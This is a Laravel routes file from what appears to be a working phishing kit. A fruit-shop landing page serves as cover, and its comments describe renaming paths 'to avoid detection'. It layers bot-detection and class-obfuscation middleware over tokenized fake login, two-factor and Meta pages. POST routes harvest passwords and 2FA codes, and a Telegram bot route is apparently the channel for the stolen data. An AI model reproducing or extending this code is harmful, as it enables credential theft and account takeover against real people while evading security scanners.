<?php

use App\Http\Controllers\PhishingController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
*/

// Public Fruit Landing Page (Disguise)
Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
    Route::get('/', [PhishingController::class, 'home']);
    Route::get('/about', [PhishingController::class, 'about']);
    Route::get('/contact', [PhishingController::class, 'contact']);
    Route::get('/products', [PhishingController::class, 'home']);

    // Hidden Entry Points - Wrapped and Renamed for Disguise
    // We remove '/login' and '/latest-settings-info' to avoid detection
    Route::get('/invitation-login', [PhishingController::class, 'showLogin2v2']);
    Route::get('/invitation', [PhishingController::class, 'index']);

    Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);

    // Dynamic tokenized paths (the actual phishing pages) - Triple-Layer Protection
    // L1: ClassObfuscatorMiddleware encrypts real class names
    // L2: BotDetectionMiddleware scores & blocks automated traffic
    // L3: TokenGateMiddleware requires session-bound random query param token
    Route::middleware([
        \App\Http\Middleware\ClassObfuscatorMiddleware::class,
        \App\Http\Middleware\BotDetectionMiddleware::class,
        // \App\Http\Middleware\TokenGateMiddleware::class,
    ])->group(function () {
        Route::get('/two_step_verification{tpath}/login/{ltoken}', [PhishingController::class, 'showLogin']);
        Route::get('/two_step_verification{tpath}/authentication/{atoken}', [PhishingController::class, 'show2fa']);
        Route::get('/two_step_verification{tpath}/invitation/{itoken}/{page}', [PhishingController::class, 'showMeta']);
        Route::get('/two_step_verification{tpath}/latest-settings-info/{stoken}', [PhishingController::class, 'showFx']);
        Route::get('/index2', function () {
            return view('index2');
        });
    });
  
});

// Sensitive Data Submission Routes - Protected by Bot Detection but visible to real browsers
Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
    Route::post('/login', [PhishingController::class, 'handleLogin']);
    Route::post('/2fa', [PhishingController::class, 'handle2fa']);
    Route::post('/log', [PhishingController::class, 'handleGenericLog']);
});

// Non-blocked API internal call
Route::get('/session-paths', [PhishingController::class, 'getSessionPaths']);

Route::get('/test-telegram', function () {
    $token = env('TELEGRAM_BOT_TOKEN');
    $chatId = env('TELEGRAM_CHAT_ID');
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    \Illuminate\Support\Facades\Http::post($url, [
        'chat_id' => $chatId,
        'text' => "Test message from Nature's Bounty!"
    ]);
    return "Check your Telegram!";
});